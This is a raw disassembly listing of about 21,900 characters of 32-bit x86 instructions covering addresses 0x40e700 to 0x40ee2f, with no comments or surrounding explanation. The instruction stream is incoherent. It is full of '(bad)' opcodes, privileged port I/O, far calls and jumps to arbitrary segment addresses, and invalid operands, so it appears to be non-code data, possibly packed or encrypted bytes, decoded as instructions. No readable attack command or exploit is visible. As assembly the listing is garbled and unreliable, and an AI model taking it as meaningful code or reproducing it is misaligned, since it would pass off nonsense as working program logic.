  40e700:	push   0x71825b73
  40e705:	pop    esi
  40e706:	push   edi
  40e707:	cmp    edi,edx
  40e709:	add    BYTE PTR [edx-0xa02ef3b],bh
  40e70f:	cli    
  40e710:	push   ebx
  40e711:	scas   eax,DWORD PTR es:[edi]
  40e712:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e713:	dec    esi
  40e714:	popf   
  40e715:	rcr    DWORD PTR [ebp+eiz*4-0x4c],1
  40e719:	imul   esi,DWORD PTR [esi],0xffffffc5
  40e71c:	daa    
  40e71d:	mov    eax,0xecc52612
  40e722:	jmp    0x40e6f3
  40e724:	(bad)  
  40e725:	fiadd  WORD PTR [edx]
  40e727:	fcom   QWORD PTR [eax-0xd]
  40e72a:	pop    ecx
  40e72b:	sbb    cl,BYTE PTR [esi+0x22]
  40e72e:	stc    
  40e72f:	add    ecx,0x32
  40e732:	mov    ds:0xa8833120,eax
  40e737:	inc    esi
  40e738:	sbb    al,0x59
  40e73a:	stos   DWORD PTR es:[edi],eax
  40e73b:	test   al,0x38
  40e73d:	jle    0x40e76a
  40e73f:	add    bl,ch
  40e741:	aam    0x5e
  40e743:	call   0xe941e934
  40e748:	stos   DWORD PTR es:[edi],eax
  40e749:	inc    edi
  40e74a:	jnp    0x40e6d7
  40e74c:	cmp    BYTE PTR [ebp-0x3],0x69
  40e750:	in     eax,dx
  40e751:	std    
  40e752:	clc    
  40e753:	cmp    esi,DWORD PTR [esi-0x3002a8c8]
  40e759:	jecxz  0x40e755
  40e75b:	cmp    BYTE PTR [edx+eiz*2-0x5f],ah
  40e75f:	lahf   
  40e760:	(bad)
  40e763:	ins    BYTE PTR es:[edi],dx
  40e764:	int3   
  40e765:	cmc    
  40e766:	sub    al,0x88
  40e768:	popf   
  40e769:	dec    edi
  40e76a:	dec    edi
  40e76b:	and    DWORD PTR [ecx-0x3e],esi
  40e76e:	sub    al,BYTE PTR [eax]
  40e770:	xchg   ecx,eax
  40e771:	or     ebp,DWORD PTR [ecx]
  40e773:	push   0xbbe5fbca
  40e778:	jle    0x40e7e1
  40e77a:	sbb    DWORD PTR [ebp-0x39],0x54329bfa
  40e781:	sar    DWORD PTR [eax],1
  40e783:	sbb    DWORD PTR [ebp+edx*1+0x19c39fb8],edi
  40e78a:	pop    ds
  40e78b:	push   ds
  40e78c:	stc    
  40e78d:	jne    0x40e76a
  40e78f:	fcom   QWORD PTR [eax+0x410b32d9]
  40e795:	pop    edx
  40e796:	pusha  
  40e797:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e798:	icebp  
  40e799:	pop    edx
  40e79a:	mov    ebp,0x3a436ef6
  40e79f:	sahf   
  40e7a0:	popa   
  40e7a1:	xor    BYTE PTR [esi+0x71],ah
  40e7a4:	test   DWORD PTR [esi],ebp
  40e7a6:	push   eax
  40e7a7:	fbstp  TBYTE PTR [esp+ecx*4+0x6206ff2]
  40e7ae:	aaa    
  40e7af:	push   esi
  40e7b0:	ins    DWORD PTR es:[edi],dx
  40e7b1:	inc    esp
  40e7b2:	shr    DWORD PTR [ecx-0x6d],1
  40e7b5:	lea    esp,[edi+0x69f54405]
  40e7bb:	out    0xb0,eax
  40e7bd:	std    
  40e7be:	mov    DWORD PTR [ebp-0x568d5e39],0xf25e499d
  40e7c8:	mov    edx,0x593a114c
  40e7cd:	sahf   
  40e7ce:	cs aam 0x88
  40e7d1:	je     0x40e817
  40e7d3:	xchg   ecx,eax
  40e7d4:	pop    ds
  40e7d5:	mov    edi,0x1d88660c
  40e7da:	shl    DWORD PTR [edi],1
  40e7dc:	and    BYTE PTR [eax],dh
  40e7de:	mov    cl,dl
  40e7e0:	pushf  
  40e7e1:	and    eax,0x549bd2c5
  40e7e6:	dec    esi
  40e7e7:	fcom   DWORD PTR [ebx]
  40e7e9:	push   ecx
  40e7ea:	ret    
  40e7eb:	retf   
  40e7ec:	scas   al,BYTE PTR es:[edi]
  40e7ed:	scas   al,BYTE PTR es:[edi]
  40e7ee:	test   al,0x9c
  40e7f0:	ss push ebx
  40e7f2:	stc    
  40e7f3:	push   ebp
  40e7f4:	jnp    0x40e7ae
  40e7f6:	add    dl,al
  40e7f8:	mov    bl,0x99
  40e7fa:	into   
  40e7fb:	loop   0x40e7bc
  40e7fd:	pop    ss
  40e7fe:	pop    ecx
  40e7ff:	or     DWORD PTR ds:0x846cb564,ebx
  40e805:	pop    edx
  40e806:	pop    ebx
  40e807:	std    
  40e808:	jns    0x40e7e7
  40e80a:	or     al,0x75
  40e80c:	inc    esp
  40e80d:	dec    ecx
  40e80e:	inc    ebp
  40e80f:	ficomp WORD PTR [esi+0x34]
  40e812:	loop   0x40e7dd
  40e814:	lods   al,BYTE PTR ds:[esi]
  40e815:	repnz and WORD PTR ss:[esi-0x4d],cx
  40e81b:	repz push 0xe34a0e6c
  40e821:	ss ss jae 0x40e80e
  40e825:	add    BYTE PTR [edi],cl
  40e827:	xlat   BYTE PTR ds:[ebx]
  40e828:	xor    DWORD PTR [ecx],0x1b7916be
  40e82e:	inc    ecx
  40e82f:	adc    eax,0x7b6091f3
  40e834:	adc    DWORD PTR [ecx-0x39],eax
  40e837:	addr16 int3 
  40e839:	jge    0x40e7c3
  40e83b:	sbb    ah,dl
  40e83d:	ins    DWORD PTR es:[edi],dx
  40e83e:	pop    edi
  40e83f:	ins    DWORD PTR es:[edi],dx
  40e840:	(bad)  
  40e841:	(bad)  
  40e842:	sti    
  40e843:	xchg   ecx,eax
  40e844:	mov    al,ds:0xa128b2aa
  40e849:	jnp    0x40e8c5
  40e84b:	pop    edx
  40e84c:	pop    esp
  40e84d:	pusha  
  40e84e:	pop    esp
  40e84f:	pop    esp
  40e850:	mov    bh,bh
  40e852:	push   edi
  40e853:	inc    edi
  40e854:	and    DWORD PTR [eax-0x4129f6e1],0xffffffa4
  40e85b:	mov    ?,WORD PTR [edi+0x7]
  40e85e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e85f:	inc    ecx
  40e860:	jne    0x40e81e
  40e862:	das    
  40e863:	scas   eax,DWORD PTR es:[edi]
  40e864:	xor    DWORD PTR [ecx-0x61],0xcaf9af12
  40e86b:	test   BYTE PTR [edx+0x3f],cl
  40e86e:	dec    edi
  40e86f:	jbe    0x40e88b
  40e871:	call   0x429dbf8f
  40e876:	int    0x2d
  40e878:	xor    ebp,DWORD PTR [edx-0x208a54c3]
  40e87e:	cmp    bl,ch
  40e880:	xor    bh,BYTE PTR [edx-0x55]
  40e883:	mov    ecx,0xa1602a31
  40e888:	mov    eax,ds:0x42c7aadd
  40e88d:	(bad)  
  40e88e:	pop    ecx
  40e88f:	or     bp,di
  40e892:	call   0xe18f9951
  40e897:	ss inc edi
  40e899:	cmp    eax,DWORD PTR [edi-0x6b]
  40e89c:	sbb    dl,BYTE PTR [eax]
  40e89e:	out    dx,eax
  40e89f:	scas   eax,DWORD PTR es:[edi]
  40e8a0:	push   ebx
  40e8a1:	cmp    edx,DWORD PTR [esi-0x26]
  40e8a4:	popf   
  40e8a5:	outs   dx,DWORD PTR ds:[esi]
  40e8a6:	mov    bh,0x80
  40e8a8:	aad    0x97
  40e8aa:	push   es
  40e8ab:	in     eax,dx
  40e8ac:	shr    BYTE PTR [esi-0x4d],0x9d
  40e8b0:	jmp    0x9ae735ca
  40e8b5:	and    ecx,ebx
  40e8b7:	aas    
  40e8b8:	std    
  40e8b9:	repz sbb dl,0xbf
  40e8bd:	call   0xb5ae:0xd3de5d81
  40e8c4:	ins    BYTE PTR es:[edi],dx
  40e8c5:	sbb    eax,ecx
  40e8c7:	gs mov esp,0x5525cec5
  40e8cd:	mov    eax,ds:0x18f0c4f3
  40e8d2:	or     al,0x12
  40e8d4:	test   al,0xdf
  40e8d6:	sahf   
  40e8d7:	add    BYTE PTR [ebx-0x20],ah
  40e8da:	imul   esi,DWORD PTR [esi+0x67],0xffffff8e
  40e8de:	inc    ebp
  40e8df:	xor    cl,bl
  40e8e1:	sub    DWORD PTR [eax+0x45af64f1],edx
  40e8e7:	dec    eax
  40e8e8:	push   edi
  40e8e9:	sti    
  40e8ea:	and    al,0x2
  40e8ec:	sub    edi,ebx
  40e8ee:	sti    
  40e8ef:	outs   dx,BYTE PTR ds:[esi]
  40e8f0:	mov    edi,0xf3a94525
  40e8f5:	in     eax,0x5f
  40e8f7:	ja     0x40e952
  40e8f9:	fwait
  40e8fa:	sub    DWORD PTR [ebp+0x27],esi
  40e8fd:	inc    esp
  40e8fe:	pop    ss
  40e8ff:	and    BYTE PTR [ebx+esi*2],0x3f
  40e903:	adc    DWORD PTR [esi+eiz*4+0x1e],ecx
  40e907:	mov    esp,eax
  40e909:	in     al,0xaf
  40e90b:	rol    DWORD PTR [edi],cl
  40e90d:	bound  ecx,QWORD PTR [ecx+0x651671c6]
  40e913:	xchg   esp,eax
  40e914:	shl    al,cl
  40e916:	mov    esi,0x748bd2a6
  40e91b:	inc    ebp
  40e91c:	lods   eax,DWORD PTR ds:[esi]
  40e91d:	mov    ?,esp
  40e91f:	xor    eax,0x44f37011
  40e924:	pusha  
  40e925:	std    
  40e926:	loop   0x40e903
  40e928:	mov    al,ds:0xaa01e194
  40e92d:	int    0xc0
  40e92f:	ja     0x40e8eb
  40e931:	repz push ds
  40e933:	mov    esi,0x8806ccc0
  40e938:	call   0x3cd952d2
  40e93d:	imul   ebx,ebx,0xffffff92
  40e940:	adc    eax,ecx
  40e942:	enter  0x3953,0x60
  40e946:	push   esp
  40e947:	mov    cs,esp
  40e949:	fmulp  st(2),st
  40e94b:	lock sub ebx,DWORD PTR [ecx-0x5c2958b3]
  40e952:	jb     0x40e980
  40e954:	adc    dl,ah
  40e956:	pop    edi
  40e957:	adc    al,0x10
  40e959:	mov    eax,0xa6dc8ba7
  40e95e:	cmp    eax,0x451b5249
  40e963:	add    esi,ebp
  40e965:	leave  
  40e966:	mov    bh,0x78
  40e968:	mov    ah,0x71
  40e96a:	test   DWORD PTR [ecx+0xd],ecx
  40e96d:	into   
  40e96e:	lods   eax,DWORD PTR fs:[esi]
  40e970:	call   0x43c5:0x6698a0ad
  40e977:	(bad)  
  40e978:	mov    edi,DWORD PTR [ebp-0x4e]
  40e97b:	repz add esi,esi
  40e97e:	es inc esi
  40e980:	(bad)  [esi+ecx*8-0x2]
  40e984:	fstp   QWORD PTR [esi-0x5f02648b]
  40e98a:	lods   al,BYTE PTR ds:[esi]
  40e98b:	jne    0x40e91b
  40e98d:	fsubr  DWORD PTR ds:0x69a2a3ef
  40e993:	jo     0x40e946
  40e995:	iret   
  40e996:	jmp    FWORD PTR [ebx+0x4c52a117]
  40e99c:	add    eax,0x8efe303c
  40e9a1:	and    bh,BYTE PTR [ebx]
  40e9a3:	loop   0x40e9f7
  40e9a5:	push   es
  40e9a6:	inc    esp
  40e9a7:	mov    ds:0x2b9ebc1f,al
  40e9ac:	or     esp,ebx
  40e9ae:	or     ah,BYTE PTR [ebp+edx*2-0x3ce24183]
  40e9b5:	in     al,0xc6
  40e9b7:	(bad)  
  40e9b8:	stos   DWORD PTR es:[edi],eax
  40e9b9:	mov    dl,0x86
  40e9bb:	sbb    dl,dh
  40e9bd:	fadd   QWORD PTR [ecx]
  40e9bf:	pop    es
  40e9c0:	jecxz  0x40e9e0
  40e9c2:	sbb    BYTE PTR [ebx+ebp*2+0x4113b233],ch
  40e9c9:	addr16 (bad) 
  40e9cb:	adc    DWORD PTR cs:[ebx],0xbac6bd9
  40e9d2:	mov    ds:0x4ba15540,al
  40e9d7:	loope  0x40e9da
  40e9d9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e9da:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e9db:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e9dc:	ja     0x40ea27
  40e9de:	or     ebp,DWORD PTR [edi-0x30]
  40e9e1:	mov    dl,BYTE PTR [edi+0x41ef1ed8]
  40e9e7:	adc    BYTE PTR [esi-0x5d],0xfd
  40e9eb:	xlat   BYTE PTR ds:[ebx]
  40e9ec:	ret    
  40e9ed:	xor    DWORD PTR [ebx],eax
  40e9ef:	ins    DWORD PTR es:[edi],dx
  40e9f0:	bound  esi,QWORD PTR [edx-0x40d1e278]
  40e9f6:	xchg   esi,eax
  40e9f7:	ficom  DWORD PTR [ecx+0xa6f853a]
  40e9fd:	mov    dl,0xc2
  40e9ff:	mov    bl,0x77
  40ea01:	repz addr16 pop ebx
  40ea04:	cmc    
  40ea05:	or     ebx,eax
  40ea07:	stos   DWORD PTR es:[edi],eax
  40ea08:	leave  
  40ea09:	sahf   
  40ea0a:	jbe    0x40ea69
  40ea0c:	cli    
  40ea0d:	jne    0x40e9e6
  40ea0f:	aad    0xf5
  40ea11:	and    ah,BYTE PTR [edx-0x502bcff6]
  40ea17:	mov    WORD PTR [esi+edx*2+0x5d],fs
  40ea1b:	push   esi
  40ea1c:	push   0xaf048418
  40ea21:	adc    dh,ah
  40ea23:	out    0xa6,eax
  40ea25:	xchg   esp,eax
  40ea26:	add    eax,0xec0cc9d6
  40ea2b:	nop
  40ea2c:	mov    ds:0x6c56a58e,eax
  40ea31:	popf   
  40ea32:	add    esp,edi
  40ea34:	int    0x50
  40ea36:	scas   eax,DWORD PTR es:[edi]
  40ea37:	sub    BYTE PTR [ecx],0xa2
  40ea3a:	pop    ds
  40ea3b:	imul   esp,DWORD PTR [edx-0x561bfdc2],0x521c99f9
  40ea45:	les    edx,FWORD PTR [esi]
  40ea47:	mov    eax,0x39ac9ca8
  40ea4c:	mov    ebx,ebp
  40ea4e:	sbb    cl,BYTE PTR [edi+0x7aec2ef6]
  40ea54:	adc    DWORD PTR [esi-0x6cad03c9],0x747f23a9
  40ea5e:	pushf  
  40ea5f:	pop    esi
  40ea60:	aas    
  40ea61:	add    ch,BYTE PTR [eax-0x38]
  40ea64:	pop    ds
  40ea65:	and    eax,0x26f67e9c
  40ea6a:	(bad)  
  40ea6b:	int    0xd3
  40ea6d:	scas   al,BYTE PTR es:[edi]
  40ea6e:	xchg   edi,eax
  40ea6f:	loop   0x40ea61
  40ea71:	push   edx
  40ea72:	fwait
  40ea73:	jns    0x40ea0c
  40ea75:	popf   
  40ea76:	pop    ds
  40ea77:	push   ds
  40ea78:	add    DWORD PTR [eax-0x7b],0xffffffd5
  40ea7c:	lods   al,BYTE PTR ds:[esi]
  40ea7d:	out    dx,al
  40ea7e:	cmp    DWORD PTR [ebp-0x6a],ebp
  40ea81:	add    ch,ch
  40ea83:	push   edx
  40ea84:	adc    eax,DWORD PTR [ebx+0x65]
  40ea87:	xor    eax,0x5d212c0b
  40ea8c:	int3   
  40ea8d:	pusha  
  40ea8e:	gs adc al,0x21
  40ea91:	std    
  40ea92:	sbb    dx,bx
  40ea95:	or     bh,al
  40ea97:	outs   dx,DWORD PTR ds:[esi]
  40ea98:	cs sub al,0xf1
  40ea9b:	aas    
  40ea9c:	dec    edi
  40ea9d:	sub    eax,0x1ab6061b
  40eaa2:	cmp    al,0x33
  40eaa4:	call   0x24ac:0xd6ac
  40eaaa:	outs   dx,DWORD PTR ds:[esi]
  40eaab:	pop    eax
  40eaac:	and    eax,0xec13847f
  40eab1:	xchg   edi,eax
  40eab2:	arpl   WORD PTR [esi+0x2d383670],cx
  40eab8:	jno    0x40eaea
  40eaba:	(bad)  
  40eabb:	adc    DWORD PTR [ecx+0x6b10733e],eax
  40eac1:	cmc    
  40eac2:	stos   BYTE PTR es:[edi],al
  40eac3:	fdivr  QWORD PTR [eax-0x11564ed9]
  40eac9:	and    dh,BYTE PTR [ebp+0x2]
  40eacc:	sbb    edi,eax
  40eace:	or     eax,0xc00fb2ec
  40ead3:	fsubr  DWORD PTR [eax+ecx*4]
  40ead6:	sub    BYTE PTR [edx],bh
  40ead8:	ds pop esp
  40eada:	aaa    
  40eadb:	rol    BYTE PTR ds:0x3dda33fd,1
  40eae1:	dec    edx
  40eae2:	mov    ds,WORD PTR [ecx+0x301df108]
  40eae8:	inc    ebp
  40eae9:	mov    bl,0xc1
  40eaeb:	add    ebx,DWORD PTR [ecx]
  40eaed:	popa   
  40eaee:	outs   dx,BYTE PTR ds:[esi]
  40eaef:	ja     0x40eafb
  40eaf1:	rcr    ebx,1
  40eaf3:	mov    edx,fs
  40eaf5:	int    0xf1
  40eaf7:	fs in  eax,dx
  40eaf9:	prefetch (bad)
  40eafa:	or     eax,0x70b642f4
  40eaff:	jbe    0x40eb3b
  40eb01:	cmc    
  40eb02:	popf   
  40eb03:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40eb04:	sbb    ebp,eax
  40eb06:	ret    0x107e
  40eb09:	imul   ebp,DWORD PTR ds:0x5264136b,0x33df1168
  40eb13:	jg     0x40eb0e
  40eb15:	adc    al,bl
  40eb17:	mov    esp,0x5326bdb5
  40eb1c:	mov    edi,0x98bd5563
  40eb21:	in     eax,dx
  40eb22:	jmp    0xd42c4cc6
  40eb27:	test   BYTE PTR [edx+0x7a],ah
  40eb2a:	jge    0x40eb37
  40eb2c:	retf   
  40eb2d:	add    al,0xff
  40eb2f:	in     al,0x35
  40eb31:	inc    ecx
  40eb32:	inc    esp
  40eb33:	inc    edi
  40eb34:	fidiv  WORD PTR [esi]
  40eb36:	imul   edi,DWORD PTR [ecx],0x2d
  40eb39:	mov    fs,esi
  40eb3b:	or     dl,dl
  40eb3d:	sbb    al,BYTE PTR [edx-0x6]
  40eb40:	mov    ebp,0x9dd80415
  40eb45:	add    al,al
  40eb47:	stc    
  40eb48:	pop    eax
  40eb49:	xchg   DWORD PTR [esi-0x46ea10d],edx
  40eb4f:	call   DWORD PTR [edi]
  40eb51:	pop    edi
  40eb52:	push   ss
  40eb53:	sub    ebx,DWORD PTR [eax+0x13]
  40eb56:	mov    BYTE PTR [edi+0x5e12f2ed],dh
  40eb5c:	inc    ebx
  40eb5d:	loop   0x40eb88
  40eb5f:	test   DWORD PTR [eax],0x4302962f
  40eb65:	out    0x72,al
  40eb67:	fnstenv [esi+edi*4+0xb977032]
  40eb6e:	dec    esi
  40eb6f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40eb70:	sbb    al,0x97
  40eb72:	push   esi
  40eb73:	cmc    
  40eb74:	cli    
  40eb75:	outs   dx,BYTE PTR ds:[esi]
  40eb77:	outs   dx,DWORD PTR ds:[esi]
  40eb78:	(bad)  
  40eb79:	jmp    0x40ebd7
  40eb7b:	mov    cl,0xd3
  40eb7d:	inc    edi
  40eb7e:	aam    0x87
  40eb80:	cmc    
  40eb81:	retf   0x9857
  40eb84:	jmp    0x2e49:0xafc9250a
  40eb8b:	bound  eax,QWORD PTR [edi-0x38]
  40eb8e:	dec    esp
  40eb8f:	ror    DWORD PTR [eax],0x87
  40eb92:	adc    BYTE PTR [ecx+edi*4],al
  40eb95:	outs   dx,BYTE PTR ds:[esi]
  40eb96:	mov    dl,0xb5
  40eb98:	stos   DWORD PTR es:[edi],eax
  40eb99:	in     eax,dx
  40eb9a:	push   ss
  40eb9b:	bound  ebp,QWORD PTR [eax-0x2c]
  40eb9e:	and    eax,0xf535fcf8
  40eba3:	imul   ebx,DWORD PTR [edi-0x12bd8e94],0x55ed2437
  40ebad:	mov    ch,0xca
  40ebaf:	inc    esp
  40ebb0:	sub    DWORD PTR [ebx-0x16f46f38],ebp
  40ebb6:	stos   BYTE PTR es:[edi],al
  40ebb7:	cmp    bl,ah
  40ebb9:	(bad)  
  40ebba:	adc    edx,DWORD PTR [ebx+ebx*4+0x6fdb35a0]
  40ebc1:	pop    ds
  40ebc2:	add    al,BYTE PTR [ebx]
  40ebc4:	inc    ecx
  40ebc5:	shl    DWORD PTR [edi+0x2a],cl
  40ebc8:	mov    ds,WORD PTR [ebx]
  40ebca:	push   ecx
  40ebcb:	les    esi,FWORD PTR [ecx+edx*2]
  40ebce:	call   0xdebd:0xb15038e4
  40ebd5:	rcr    DWORD PTR ds:0x352f7818,0x1a
  40ebdc:	jbe    0x40ebe7
  40ebde:	sbb    BYTE PTR [ebx],0xe0
  40ebe1:	xchg   esi,eax
  40ebe2:	sub    al,0xd5
  40ebe4:	aas    
  40ebe5:	mov    BYTE PTR [ebx-0x15],0x4
  40ebe9:	(bad)  
  40ebea:	jge    0x40ec05
  40ebec:	lods   eax,DWORD PTR ds:[esi]
  40ebed:	mov    cl,bh
  40ebef:	sbb    al,0x66
  40ebf1:	sbb    edi,eax
  40ebf3:	cwde   
  40ebf4:	pop    ecx
  40ebf5:	inc    ebp
  40ebf6:	out    0x54,al
  40ebf8:	jg     0x40ec32
  40ebfa:	sub    al,0x5f
  40ebfc:	leave  
  40ebfd:	add    cl,dl
  40ebff:	push   ds
  40ec00:	cwde   
  40ec01:	out    0xf2,eax
  40ec03:	sub    al,cl
  40ec05:	pop    es
  40ec06:	ror    DWORD PTR [ebp+0x2b782762],0x89
  40ec0d:	fdivr  QWORD PTR [ebx]
  40ec0f:	pop    ecx
  40ec10:	ins    DWORD PTR es:[edi],dx
  40ec11:	cmp    BYTE PTR ds:0xb95e2c49,bl
  40ec17:	jmp    0x40eba3
  40ec19:	jg     0x40ec2e
  40ec1b:	xor    DWORD PTR [esi],eax
  40ec1d:	loop   0x40ebde
  40ec1f:	out    0xcc,eax
  40ec21:	ffreep st(7)
  40ec23:	jg     0x40ec4c
  40ec25:	cmp    cl,BYTE PTR [ebp+eax*4+0x1f]
  40ec29:	in     al,dx
  40ec2a:	sub    eax,DWORD PTR [eax-0x2f07c00c]
  40ec30:	jp     0x40ec61
  40ec32:	push   esi
  40ec33:	mov    DWORD PTR [edx-0x4a],ebx
  40ec36:	or     DWORD PTR [eax],0x5a817ab9
  40ec3c:	fld    QWORD PTR [edx-0x10162482]
  40ec42:	push   cs
  40ec43:	mov    eax,ds:0x70538a20
  40ec48:	pmaxsw mm0,mm7
  40ec4b:	inc    esi
  40ec4c:	add    DWORD PTR [ebx+0x11],0xffffffd8
  40ec50:	data16 test al,0x8b
  40ec53:	xchg   edi,eax
  40ec54:	mov    cl,0x7f
  40ec57:	push   ss
  40ec58:	mov    BYTE PTR ds:0x20772fa,cl
  40ec5e:	mov    esp,0xa7209a7
  40ec63:	fidiv  WORD PTR [ebp+0x40]
  40ec66:	cli    
  40ec67:	mov    BYTE PTR [ecx+0x6d],0x44
  40ec6b:	stos   BYTE PTR es:[edi],al
  40ec6c:	jecxz  0x40ecbe
  40ec6e:	xor    ch,0x89
  40ec71:	in     eax,dx
  40ec72:	ins    DWORD PTR es:[edi],dx
  40ec73:	in     eax,dx
  40ec74:	push   ds
  40ec75:	test   al,0x4a
  40ec77:	inc    edx
  40ec78:	and    BYTE PTR [edi+esi*4-0x60],0x6f
  40ec7d:	xchg   ebp,eax
  40ec7e:	dec    ebx
  40ec7f:	lahf   
  40ec80:	jp     0x40ec18
  40ec82:	jmp    0x43d4:0x924a8bba
  40ec89:	mov    bl,0x79
  40ec8b:	adc    eax,eax
  40ec8d:	xor    eax,0x5f976b18
  40ec92:	push   0xfffffff1
  40ec94:	sub    al,0xe1
  40ec96:	mov    DWORD PTR gs:[eax+edx*8+0x17f49af6],eax
  40ec9e:	lock dec esi
  40eca0:	and    al,0x98
  40eca2:	xchg   ebx,eax
  40eca3:	arpl   WORD PTR [esi+0x6ee907d8],sp
  40eca9:	por    mm3,QWORD PTR [ecx+eax*1]
  40ecad:	gs and eax,0x52a17989
  40ecb3:	pop    esp
  40ecb4:	pop    esi
  40ecb5:	je     0x40ed1f
  40ecb7:	es retf 
  40ecb9:	or     al,0xbf
  40ecbb:	in     eax,dx
  40ecbc:	fs xchg ebp,eax
  40ecbf:	inc    esp
  40ecc0:	mov    dh,0x24
  40ecc2:	add    cl,BYTE PTR ds:0x5e133ce3
  40ecc8:	sub    al,0xf0
  40ecca:	pop    es
  40eccb:	xor    ebx,DWORD PTR [edx-0x1f7b5afe]
  40ecd1:	repnz lock xchg edx,eax
  40ecd4:	sub    BYTE PTR [edi+0xc210c01],bl
  40ecda:	outs   dx,BYTE PTR ds:[esi]
  40ecdb:	(bad)  
  40ecdc:	lock add ch,BYTE PTR [eax+0x1b]
  40ece0:	call   0xcbca:0xb113adc
  40ece7:	loopne 0x40ed1c
  40ece9:	inc    esp
  40ecea:	xchg   ebp,eax
  40eceb:	aam    0xe5
  40eced:	lods   al,BYTE PTR ds:[esi]
  40ecee:	out    dx,al
  40ecef:	mov    ds:0x6b91a94c,al
  40ecf4:	cmp    edi,esi
  40ecf6:	mov    ecx,0x9964308e
  40ecfb:	inc    ebp
  40ecfc:	out    dx,eax
  40ecfd:	pop    ecx
  40ecfe:	cmp    esp,0xffffffda
  40ed01:	push   ebx
  40ed02:	daa    
  40ed03:	in     eax,dx
  40ed04:	ret    0x9ef6
  40ed07:	mov    dl,0x9f
  40ed09:	call   0x7721:0x964c83e1
  40ed10:	fcomp  DWORD PTR [ecx]
  40ed12:	jecxz  0x40ed70
  40ed14:	in     al,dx
  40ed15:	add    ah,dh
  40ed17:	cmp    bl,0xcd
  40ed1a:	cmc    
  40ed1b:	add    DWORD PTR [edi-0x7527856d],esp
  40ed21:	call   0x596b:0xd2d7d9ae
  40ed28:	pop    edx
  40ed29:	lock xchg edi,eax
  40ed2b:	fidivr WORD PTR [ebp+edx*2+0x4538e359]
  40ed32:	js     0x40ed75
  40ed34:	test   dl,dh
  40ed36:	sti    
  40ed37:	repnz es cdq 
  40ed3a:	arpl   cx,si
  40ed3c:	mov    eax,ds:0x6976f3b
  40ed41:	dec    edi
  40ed42:	dec    ebp
  40ed43:	xor    al,0xf5
  40ed45:	sub    BYTE PTR [ecx],ah
  40ed47:	fdivr  DWORD PTR [esi]
  40ed49:	xchg   edx,eax
  40ed4a:	popf   
  40ed4b:	retf   
  40ed4c:	ja     0x40eda0
  40ed4e:	call   0xee057c54
  40ed53:	dec    eax
  40ed54:	(bad)  
  40ed55:	outs   dx,DWORD PTR ds:[esi]
  40ed56:	inc    ebp
  40ed57:	adc    BYTE PTR [eax+ebp*2],cl
  40ed5a:	push   edx
  40ed5b:	mov    edi,0xabe698fd
  40ed60:	(bad)  
  40ed61:	dec    esi
  40ed62:	loopne 0x40edb8
  40ed64:	rep lods eax,DWORD PTR ds:[esi]
  40ed66:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ed67:	hlt    
  40ed68:	pop    edi
  40ed69:	lds    ecx,FWORD PTR [ebx+ebx*1+0x3a]
  40ed6d:	mov    WORD PTR [ebp-0x72],cs
  40ed70:	scas   al,BYTE PTR es:[edi]
  40ed71:	pop    es
  40ed72:	test   ecx,0x37474455
  40ed78:	xor    BYTE PTR [esi+0x597e4c0e],ah
  40ed7e:	add    eax,DWORD PTR [esi-0x7ab415de]
  40ed84:	inc    edx
  40ed85:	cld    
  40ed86:	push   ebx
  40ed87:	push   0xffffffda
  40ed89:	mov    dl,0x1b
  40ed8b:	shl    DWORD PTR [edx],cl
  40ed8d:	neg    DWORD PTR [ebx-0x1d35364f]
  40ed93:	mov    ch,0x2f
  40ed95:	cmp    dl,BYTE PTR [eax+0x74]
  40ed98:	mov    dl,0xc4
  40ed9a:	sub    BYTE PTR [edx+edi*1],dh
  40ed9d:	(bad)  
  40ed9e:	jmp    DWORD PTR [ebx+esi*4-0x7a59d832]
  40eda5:	mov    ds,edi
  40eda7:	sub    DWORD PTR [ebx-0x566011aa],esi
  40edad:	les    edx,FWORD PTR ss:[esi]
  40edb0:	test   DWORD PTR [ebx],eax
  40edb2:	mov    al,ds:0x7a453dc1
  40edb7:	jo     0x40ed58
  40edb9:	sbb    DWORD PTR [esi-0x39],eax
  40edbc:	jnp    0x40edee
  40edbe:	lds    ebp,FWORD PTR [ebp-0x18]
  40edc1:	mov    ebp,0x776ec60b
  40edc6:	jae    0x40eded
  40edc8:	ins    DWORD PTR es:[edi],dx
  40edc9:	push   eax
  40edca:	dec    ebp
  40edcb:	or     ebx,esi
  40edcd:	xchg   ebp,eax
  40edce:	jmp    0xc635:0xfb1491e1
  40edd5:	mov    esi,0x27330cbd
  40edda:	ja     0x40edef
  40eddc:	clc    
  40eddd:	sti    
  40edde:	sbb    ebx,ebp
  40ede0:	push   ebp
  40ede1:	jbe    0x40ee25
  40ede3:	scas   al,BYTE PTR es:[edi]
  40ede4:	xchg   edx,eax
  40ede5:	push   esp
  40ede6:	jb     0x40ee4c
  40ede8:	dec    ebx
  40ede9:	ins    DWORD PTR es:[edi],dx
  40edea:	mov    ds,WORD PTR [ebp-0x19]
  40eded:	cmp    eax,0xd9940fb7
  40edf2:	lods   eax,DWORD PTR ds:[esi]
  40edf3:	and    bh,dl
  40edf5:	rol    edi,1
  40edf7:	out    dx,eax
  40edf8:	adc    ecx,DWORD PTR [ebx-0x23]
  40edfb:	in     eax,0xbf
  40edfd:	xor    DWORD PTR [eax+0x68],edx
  40ee00:	retf   0x3a35
  40ee03:	jns    0x40ed8d
  40ee05:	repz addr16 enter 0x3e75,0x42
  40ee0b:	cmc    
  40ee0c:	adc    DWORD PTR fs:[ebx-0x77],esi
  40ee10:	inc    esi
  40ee11:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ee12:	push   esp
  40ee13:	hlt    
  40ee14:	fs inc esi
  40ee16:	lods   al,BYTE PTR ds:[esi]
  40ee17:	pop    ebx
  40ee18:	lds    esp,FWORD PTR [esi-0x40]
  40ee1b:	sbb    DWORD PTR [ecx-0x3f],0x7e
  40ee1f:	jns    0x40ee57
  40ee21:	cmp    BYTE PTR [ebx+ecx*8-0x55],dl
  40ee25:	push   esi
  40ee26:	aas    
  40ee27:	cdq    
  40ee28:	loop   0x40ee97
  40ee2a:	daa    
  40ee2b:	jne    0x40edeb
  40ee2d:	int    0xaf
  40ee2f:	pop    edx
